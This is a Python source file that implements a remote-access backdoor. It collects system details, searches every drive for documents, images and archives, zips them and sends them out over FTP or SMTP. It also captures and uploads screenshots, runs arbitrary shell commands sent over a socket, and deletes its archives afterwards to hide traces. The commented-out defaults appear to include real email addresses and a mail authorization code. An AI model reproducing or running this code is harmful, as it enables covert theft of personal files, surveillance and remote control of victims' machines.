#!/usr/bin/python
# -*- coding:utf-8 -*-

from socket import *
import subprocess
from ftplib import FTP
import os
import sys
import time
#import socket
import glob
import uuid
import platform
import re
import zipfile
import getpass
import smtplib
import email.mime.multipart
import email.mime.text
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import pyscreenshot as ImageGrab
import optparse
from multiprocessing import Process

class MyFTP:
    """
        ftp自动下载、自动上传脚本，可以递归目录操作
        作者：欧阳鹏
        博客地址：http://blog.csdn.net/ouyang_peng/article/details/79271113
    """

    def __init__(self, host, port=21):
        """ 初始化 FTP 客户端
        参数:
                 host:ip地址

                 port:端口号
        """
        # print("__init__()---> host = %s ,port = %s" % (host, port))

        self.host = host
        self.port = port
        self.ftp = FTP()
        # 重新设置下编码方式
        self.ftp.encoding = 'gbk'
        self.log_file = open("log.txt", "a")
        self.file_list = []

    def login(self, username, password):
        """ 初始化 FTP 客户端
            参数:
                  username: 用户名

                 password: 密码
            """
        try:
            timeout = 60
            setdefaulttimeout(timeout)
            # 0主动模式 1 #被动模式
            self.ftp.set_pasv(False)
            # 打开调试级别2，显示详细信息
            # self.ftp.set_debuglevel(2)

            self.debug_print('开始尝试连接到 %s' % self.host)
            self.ftp.connect(self.host, self.port)
            self.debug_print('成功连接到 %s' % self.host)

            self.debug_print('开始尝试登录到 %s' % self.host)
            self.ftp.login(username, password)
            self.debug_print('成功登录到 %s' % self.host)

            self.debug_print(self.ftp.welcome)
        except Exception as err:
            self.deal_error("FTP 连接或登录失败 ，错误描述为：%s" % err)
            pass

    def is_same_size(self, local_file, remote_file):
        """判断远程文件和本地文件大小是否一致

           参数:
             local_file: 本地文件

             remote_file: 远程文件
        """
        try:
            remote_file_size = self.ftp.size(remote_file)
        except Exception as err:
            # self.debug_print("is_same_size() 错误描述为：%s" % err)
            remote_file_size = -1

        try:
            local_file_size = os.path.getsize(local_file)
        except Exception as err:
            # self.debug_print("is_same_size() 错误描述为：%s" % err)
            local_file_size = -1

        self.debug_print('local_file_size:%d  , remote_file_size:%d' % (local_file_size, remote_file_size))
        if remote_file_size == local_file_size:
            return 1
        else:
            return 0

    def download_file(self, local_file, remote_file):
        """从ftp下载文件
            参数:
                local_file: 本地文件

                remote_file: 远程文件
        """
        self.debug_print("download_file()---> local_path = %s ,remote_path = %s" % (local_file, remote_file))

        if self.is_same_size(local_file, remote_file):
            self.debug_print('%s 文件大小相同，无需下载' % local_file)
            return
        else:
            try:
                self.debug_print('>>>>>>>>>>>>下载文件 %s ... ...' % local_file)
                buf_size = 1024
                file_handler = open(local_file, 'wb')
                self.ftp.retrbinary('RETR %s' % remote_file, file_handler.write, buf_size)
                file_handler.close()
            except Exception as err:
                self.debug_print('下载文件出错，出现异常：%s ' % err)
                return

    def download_file_tree(self, local_path, remote_path):
        """从远程目录下载多个文件到本地目录
                       参数:
                         local_path: 本地路径

                         remote_path: 远程路径
                """
        print("download_file_tree()--->  local_path = %s ,remote_path = %s" % (local_path, remote_path))
        try:
            self.ftp.cwd(remote_path)
        except Exception as err:
            self.debug_print('远程目录%s不存在，继续...' % remote_path + " ,具体错误描述为：%s" % err)
            return

        if not os.path.isdir(local_path):
            self.debug_print('本地目录%s不存在，先创建本地目录' % local_path)
            os.makedirs(local_path)

        self.debug_print('切换至目录: %s' % self.ftp.pwd())

        self.file_list = []
        # 方法回调
        self.ftp.dir(self.get_file_list)

        remote_names = self.file_list
        self.debug_print('远程目录 列表: %s' % remote_names)
        for item in remote_names:
            file_type = item[0]
            file_name = item[1]
            local = os.path.join(local_path, file_name)
            if file_type == 'd':
                print("download_file_tree()---> 下载目录： %s" % file_name)
                self.download_file_tree(local, file_name)
            elif file_type == '-':
                print("download_file()---> 下载文件： %s" % file_name)
                self.download_file(local, file_name)
            self.ftp.cwd("..")
            self.debug_print('返回上层目录 %s' % self.ftp.pwd())
        return True

    def upload_file(self, local_file, remote_file):
        """从本地上传文件到ftp

           参数:
             local_path: 本地文件

             remote_path: 远程文件
        """
        if not os.path.isfile(local_file):
            self.debug_print('%s 不存在' % local_file)
            return

        if self.is_same_size(local_file, remote_file):
            self.debug_print('跳过相等的文件: %s' % local_file)
            return

        buf_size = 1024
        file_handler = open(local_file, 'rb')
        print('test',type(local_file),local_file)




        #self.ftp.storbinary()
        self.ftp.storbinary('STOR %s' % remote_file, file_handler, buf_size)
        file_handler.close()
        self.debug_print('上传: %s' % local_file + "成功!")

    def upload_file_tree(self, local_path, remote_path):
        """从本地上传目录下多个文件到ftp
           参数:

             local_path: 本地路径

             remote_path: 远程路径
        """
        if not os.path.isdir(local_path):
            self.debug_print('本地目录 %s 不存在' % local_path)
            return
        """
        创建服务器目录
        """
        try:
            self.ftp.cwd(remote_path)  # 切换工作路径
        except Exception as e:
            base_dir, part_path = self.ftp.pwd(), remote_path.split('/')
            for p in part_path[1:-1]:
                base_dir = base_dir + p + '/'  # 拼接子目录
                try:
                    self.ftp.cwd(base_dir)  # 切换到子目录, 不存在则异常
                except Exception as e:
                    print('INFO:', e)
                    self.ftp.mkd(base_dir)  # 不存在创建当前子目录
        #self.ftp.cwd(remote_path)
        self.debug_print('切换至远程目录: %s' % self.ftp.pwd())

        local_name_list = os.listdir(local_path)
        self.debug_print('本地目录list: %s' % local_name_list)
        #self.debug_print('判断是否有服务器目录: %s' % os.path.isdir())

        for local_name in local_name_list:
            src = os.path.join(local_path, local_name)
            print("src路径=========="+src)
            if os.path.isdir(src):
                try:
                    self.ftp.mkd(local_name)
                except Exception as err:
                    self.debug_print("目录已存在 %s ,具体错误描述为：%s" % (local_name, err))
                self.debug_print("upload_file_tree()---> 上传目录： %s" % local_name)
                self.debug_print("upload_file_tree()---> 上传src目录： %s" % src)
                self.upload_file_tree(src, local_name)
            else:
                self.debug_print("upload_file_tree()---> 上传文件： %s" % local_name)
                self.upload_file(src, local_name)
        self.ftp.cwd("..")

    def close(self):
        """ 退出ftp
        """
        self.debug_print("close()---> FTP退出")
        self.ftp.quit()
        self.log_file.close()

    def debug_print(self, s):
        """ 打印日志
        """
        self.write_log(s)

    def deal_error(self, e):
        """ 处理错误异常
            参数：
                e：异常
        """
        log_str = '发生错误: %s' % e
        self.write_log(log_str)
        sys.exit()

    def write_log(self, log_str):
        """ 记录日志
            参数：
                log_str：日志
        """
        time_now = time.localtime()
        date_now = time.strftime('%Y-%m-%d', time_now)
        format_log_str = "%s ---> %s \n " % (date_now, log_str)
        print(format_log_str)
        self.log_file.write(format_log_str)

    def get_file_list(self, line):
        """ 获取文件列表
            参数：
                line：
        """
        file_arr = self.get_file_name(line)
        # 去除  . 和  ..
        if file_arr[1] not in ['.', '..']:
            self.file_list.append(file_arr)

    def get_file_name(self, line):
        """ 获取文件名
            参数：
                line：
        """
        pos = line.rfind(':')
        while (line[pos] != ' '):
            pos += 1
        while (line[pos] == ' '):
            pos += 1
        file_arr = [line[0], line[pos:]]
        return file_arr



class Collect_Send:
    def __init__(self,interst='zip,rar,txt,docx,mp3,jpg,png,doc',compress='colloct'):
        print("defualt limit file size is 2M")
        # print("__init__()---> host = %s ,port = %s" % (host, port))
        self.suff=(interst.strip()).split(',')
        l=[]
        for i in range(len(self.suff)):
            l.append([])
        self.suff_dict=dict(zip(self.suff,l))
        self.limit_size=1024*1024*20
        self.system=platform.system()
        self.system=(self.system).upper()
        self.compress=compress
        self.ftpip=""#"192.168.2.102"
        self.ftpname=""#"root"
        self.ftppassword=""#"toor"
        self.smtp_host=''#'smtp.qq.com'
        self.smtp_port=''#'465'
        self.smtp_sendAddr=''#'2689825303@qq.com'
        self.smtp_password=''#'pgznkwstwhmfdgje'
        self.smtp_recipientAddrs=''#'399982971@qq.com'
    def find_all_path(self,dirnames):
        print('搜索并压缩本路径下所有符合条件的文件:'+'、'.join(dirnames))
        result = []#所有的文件

        for dirname in dirnames:
            limit=0
            for maindir, subdir, file_name_list in os.walk(dirname):

                #print("1:",maindir) #当前主目录
                #print("2:",subdir) #当前主目录下的所有目录
                #print("3:",file_name_list)  #当前主目录下的所有文件
                
                for filename in file_name_list:
                    f_t=filename.split('.')[-1]
                    if f_t in self.suff:
                        apath = os.path.join(maindir, filename)#合并成一个完整路径
                        result.append(apath)
                        limit+=1
                        self.suff_dict[f_t].append(apath)
                #     if limit==20:#test
                        
                #         break
                # if limit==20:#test

                #     break

        return result
    def get_zip(self,allpath,aimfile):
        if self.system=='':
            raise Exception("need get system info")
        newzip=zipfile.ZipFile(aimfile+'.zip','w')
        
        print('生成的zip文件:'+aimfile+'.zip')
        for f in allpath:
            try:
                #print("compress"+f)
                fsize=os.path.getsize(f)
                
                (filepath, tempfilename) = os.path.split(f)
                print(filepath, tempfilename)
                if fsize<self.limit_size and f!=(os.getcwd()+aimfile+'.zip') :
                    newzip.write(f,arcname=tempfilename)#去除路径
                else:
                    print("Warning:this file can't exceed 1M ,this size is"+str(fsize))
            except :
                #print(e.values)
                print("Eorr:"+f +"can't compress")
                pass
        return(aimfile+'.zip')
    def get_zip_big(self,allpath,aimfile):
        if self.system=='':
            raise Exception("need get system info")
        newzip=zipfile.ZipFile(aimfile+'.zip','w')
        
        print('生成的zip文件:'+aimfile+'.zip')
        for f in allpath:
            try:
                #print("compress"+f)
                fsize=os.path.getsize(f)
                
                (filepath, tempfilename) = os.path.split(f)
                print(filepath, tempfilename)
                if  (os.getcwd()+aimfile+'.zip')!= f :
                    newzip.write(f,arcname=tempfilename)#去除路径
                else:
                    print('Erro name:',aimfile)
            except :
                #print(e.values)
                print("Eorr:"+f +"can't compress")
                pass
        return(aimfile+'.zip')
    # 获取Mac地址
    def get_mac_address(self):
        mac=uuid.UUID(int = uuid.getnode()).hex[-12:]
        return ":".join([mac[e:e+2] for e in range(0,11,2)])

    def get_systeminfo(self):
        plat_tuple=platform.architecture()
        
        #######得到ip
        try:
            addrs = getaddrinfo(gethostname(),None)
            ip=''
            for item in addrs:
                ip+=item[4][0]+'\n'

        except:
            myname = getfqdn(gethostname( ))
            ip=gethostbyname(myname)
        #########


        mac=self.get_mac_address()#mac
        user_name = getpass.getuser() # 获取当前用户名
        hostname = gethostname()#主机名
        plat_version=platform.platform()#平台版本
        #######write in file
        key=open('keyinformation.txt','w')
        print('目标主机信息:keyinformation.txt')
        key.write('\nsystem '+self.system)
        key.write('\nip '+ip)
        key.write('\nmac '+mac)
        key.write('\nuser_name '+user_name)
        key.write('\nhostname '+hostname)
        key.write('\nplat_version '+plat_version)
        key.close()
        #########
        system_info=self.system+'\n'+ip+'\n'+mac+'\n'+user_name+'\n'+hostname+'\n'+plat_version
        return system_info
    #遍历字母A到Z，忽略光驱的盘符
    def get_disklist(self):
        ret=[]
        for i in range(65,91):
            vol = chr(i) + ':'
            if os.path.isdir(vol):
                ret.append(vol)
        return ret
    def collect(self):
        self.get_systeminfo()
        if self.system=='WINDOWS':

            disk_list=self.get_disklist()
            self.find_all_path(disk_list)
            end_path_arr=['keyinformation.txt']
            for key,all_path in self.suff_dict.items():
                self.get_zip(all_path,key)
                end_path_arr.append(key+'.zip')
            self.get_zip_big(end_path_arr,self.compress)
            for r in end_path_arr:
                os.remove(r)
        if self.system=='LINUX':

            self.find_all_path(['/'])
            end_path_arr=['keyinformation.txt']
            for key,all_path in self.suff_dict.items():
                self.get_zip(all_path,key)
                end_path_arr.append(key+'.zip')
            print(end_path_arr)

            self.get_zip_big(end_path_arr,self.compress)
            for r in end_path_arr:
                os.remove(r)
        return(self.compress+'.zip')
    def ftpsend(self,file_name,aim_file=('/colloct.zip')):

        if len(self.ftpip)==0 or len(self.ftpname)==0 or len(self.ftppassword)==0 :
            raise Exception("please init ftp info")
        print(self.ftpip,self.ftpname,self.ftppassword,file_name,aim_file)
        my_ftp = MyFTP(self.ftpip)#连接ftp服务器
        my_ftp.login(self.ftpname, self.ftppassword)#登录ftp服务器
        #path=os.getcwd()+"/"+file_name
        path=file_name
        my_ftp.upload_file(path,aim_file)#上传文件到ftp服务器
        my_ftp.close()#关闭ftp服务
    def ftpdownload(self,sourcefile,destfile):
        if len(self.ftpip)==0 or len(self.ftpname)==0 or len(self.ftppassword)==0 :
            raise Exception("please init ftp info")
        my_ftp = MyFTP(self.ftpip)#连接ftp服务器
        my_ftp.login(self.ftpname, self.ftppassword)#登录ftp服务器
        #path=os.getcwd()+"/"+file_name
        my_ftp.download_file(sourcefile,destfile)#download文件到ftp client
        my_ftp.close()#关闭ftp服务
    def collec_ftpsend(self,aimfile=('/colloct.zip')):
        s=self.collect()
        s=os.getcwd()+"/"+s
        self.ftpsend(s,aimfile)
        os.remove(s)#清除收集、打包痕迹

    def smtpsend(self,sourcefile,subject='uploadfile', content='attacked comp upload file'):
        '''
        :smtp_host: 域名
        :smtp_port: 端口
        :sendAddr: 发送邮箱
        :password: 邮箱密码
        :recipientAddrs: 发送地址
        :subject: 标题
        :content: 内容
        :return: 无
        '''
        #build a mime
        msg = email.mime.multipart.MIMEMultipart()
        msg['from'] = self.smtp_sendAddr
        msg['to'] = self.smtp_recipientAddrs
        msg['subject'] = subject
        content = content
        # 邮件正文内容
        txt = email.mime.text.MIMEText(content, 'plain', 'utf-8')
        msg.attach(txt)
        '''
        作用是生成包含多个部分的邮件体的 MIME 对象，
        参数 _subtype 指定要添加到"Content-type:multipart/subtype" 报头的可选的三种子类型，
        分别为 mixed、related、alternative，默认值为 mixed。定义 mixed实现构建一个带附件的邮件体；
        定义related 实现构建内嵌资源的邮件体；定义alternative 则实现构建纯文本与超文本共存的邮件体；
        _subparts是有效负载的一系类初始部分，可以使用attach()方法将子部件附加到消息中
        '''




        # add mime file 
        sendfile = MIMEApplication(open(sourcefile, 'rb').read())
        (filepath, tempfilename) = os.path.split(sourcefile)
        sendfile.add_header('Content-Disposition', 'attachment', filename=tempfilename)  
        #为附件添加一个标题
        msg.attach(sendfile)
        while True:
            try:
                smtpSSLClient = smtplib.SMTP_SSL(self.smtp_host, int(self.smtp_port))  # 实例化一个SMTP_SSL对象
                loginRes = smtpSSLClient.login(self.smtp_sendAddr,self.smtp_password)  # 登录smtp服务器
                print(f"登录结果：loginRes = {loginRes}")  # loginRes = (235, b'Authentication successful')
                if loginRes and loginRes[0] == 235:
                    print(f"登录成功，code = {loginRes[0]}")
                    smtpSSLClient.sendmail(self.smtp_sendAddr, self.smtp_recipientAddrs, str(msg))
                    print(f"mail has been send successfully. message:{str(msg)}")
                    smtpSSLClient.quit()
                else:
                    print(f"登陆失败，code = {loginRes[0]}")
                break
            except Exception as e:
                print(f"发送失败，Exception: e={e}")
    def collec_smtpsend(self):
        c=self.collect()
        c==os.getcwd()+"/"+c
        self.smtpsend(c)
        os.remove(c)#清除收集、打包痕迹


def setserver_client(instruc):
    
    os.system(instruc)

def help():
    help_info='''
    [instruction] [arg0] [arg1] ...
    getsysteminfo
    colle_ftpupload [Dest_file_path]
    ftpupload [Sour_file_path] [Dest_file_path]
    colle_smtpupload
    smtpupload [Sour_file_path]
    input_ftpinfo [ip] [name] [password]
    input_smtpinfo [host] [port] [sendAddr] [sen_password] [recipientAddrs]
    ftpdownload [localfile_path] [remotefile_path]
    get_screen_ftp
    get_screen_smtp
    setserver [serverip]
    setclient [serverip]
    help
    q (quit)
    any command(/bin/bash or cmd) like: [ls ifconfig ....]
    '''
    return(help_info)
################################################
parser = optparse.OptionParser("usage%prog "+"-d ip -c [-s]")
parser.add_option('-d',dest = 'ip',type = 'string',help = 'server ip address')
parser.add_option('-c',action='store_true', dest='client', default=False, help='choise client')
parser.add_option('-s',action='store_true', dest='server', default=False, help = 'choise server')
#parser.add_option('-p',dest = 'port',type = 'string',help = 'specify dictionary file')
(options,args) = parser.parse_args()
if (options.ip == None):
    print(parser.usage)
    exit(0)
else:
    client_bool=options.client
    server_bool=options.server
    HOST=options.ip
    #ip='192.168.2.102'
if client_bool and not server_bool:
    s_c=True
elif not client_bool and server_bool:
    s_c=False
elif not client_bool and not server_bool:
    s_c=False
else:
    raise Exception("please chose -s or -c")
#HOST='192.168.2.102'
send_port=9998
recv_port=9999
BUFFSIZE = 1024
SADDR = (HOST,send_port)
RADDR = (HOST,recv_port)
if not s_c:#server
    StcpSliSock = socket(AF_INET,SOCK_STREAM)
    StcpSliSock.bind(SADDR) # 
    StcpSliSock.listen(5)
    StcpCliSock,addr=StcpSliSock.accept()

    RtcpSliSock = socket(AF_INET,SOCK_STREAM)
    RtcpSliSock.bind(RADDR) # 
    RtcpSliSock.listen(5)
    RtcpCliSock,addr=RtcpSliSock.accept()
else:#client
    StcpCliSock = socket(AF_INET,SOCK_STREAM)
    StcpCliSock.connect(SADDR) # 主动初始化与服务器端的连接
    RtcpCliSock = socket(AF_INET,SOCK_STREAM)
    RtcpCliSock.connect(RADDR) # 主动初始化与服务器端的连接
###############################################
def recv(size=1024):
    global RtcpCliSock
    accept_data = RtcpCliSock.recv(size)
    print(accept_data)
    return str(accept_data, encoding="utf8")
def send(send_data):
    global StcpCliSock
    StcpCliSock.sendall(bytes(send_data, encoding="utf8"))

if __name__=='__main__':

    collect=Collect_Send()
    ftpinfo=[]
    smtpinfo=[]
    screen_index=0
    #SyStem=(recv()).strip()
    while True:
        choise_str=recv()
        choises=(choise_str.strip()).split()
        choise=choises[0]
        if choise=="getsysteminfo":
            send(collect.get_systeminfo())
        elif choise=="help":
            send(help())
        elif choise=="colle_ftpupload":
            if len(ftpinfo)==0  :
                send("Warn:please init ftp info")
                continue
            #send('please input destination file name:')
            filename=choises[1]
            if len(filename)!=0:
                collect.collec_ftpsend(filename)
            else :
                collect.collec_ftpsend()
        elif choise=="ftpupload":
            if len(ftpinfo)==0  :
                send("Warn:please init ftp info")
                continue
            #send('please input source file name:')
            filename=choises[1]
            #send('please input destination file name:')
            aimfile=choises[2]
            collect.ftpsend(file_name=filename,aim_file=aimfile)
        elif choise=="colle_smtpupload":
            if len(smtpinfo)==0 :
                send("Warn:please init ftp info")
                continue
            collect.collec_smtpsend()
        elif choise=="smtpupload":
            if len(smtpinfo)==0 :
                send("Warn:please init ftp info")
                continue
            #send('please input source file name:')
            filename=choises[1]
            collect.smtpsend(filename)
        elif choise=="ftpdownload":
            collect.ftpdownload(choises[1],choises[2])
        elif choise=="input_ftpinfo":
            ftpinfo=choises[1:]
            collect.ftpip=ftpinfo[0]
            collect.ftpname=ftpinfo[1]
            collect.ftppassword=ftpinfo[2]
        elif choise=="input_smtpinfo":
            smtpinfo=choises[1:]
            collect.smtp_host=smtpinfo[0]
            collect.smtp_port=smtpinfo[1]
            collect.smtp_sendAddr=smtpinfo[2]
            collect.smtp_password=smtpinfo[3]
            collect.smtp_recipientAddrs=smtpinfo[4]
        elif choise=="get_screen_ftp":
            screen_index+=1
            filename =os.getcwd()+'/get'+str(screen_index)+'.gif'
            im = ImageGrab.grab()
            im.save(filename)
            dest_path='/get'+str(screen_index)+'.gif'
            collect.ftpsend(filename,dest_path)
            os.remove(filename)
        elif choise=="get_screen_smtp":
            screen_index+=1
            filename =os.getcwd()+'/get'+str(screen_index)+'.gif'
            im = ImageGrab.grab()
            im.save(filename)
            collect.smtpsend(filename)
            os.remove(filename)
        elif choise=="setserver":
            (a,b)=os.path.split(__file__)
            instruc="python3 "+os.getcwd()+'/'+b+" -d "+choises[1] +" -s"
            print(instruc)
            p=Process(target=setserver_client,kwargs={'instruc':instruc})
            p.daemon=True
            p.start()
        elif choise=="setclient":
            (a,b)=os.path.split(__file__)
            instruc="python3 "+os.getcwd()+'/'+b+" -d "+choises[1] +" -c"
            print(instruc)
            p=Process(target=setserver_client,kwargs={'instruc':instruc})
            p.daemon=True
            p.start()
        else:
            command_result=os.popen(choise_str)
            result=command_result.read()
            if result.find("not found")==-1:
                send(result)
            else:
                send(help())
        send('\n>')











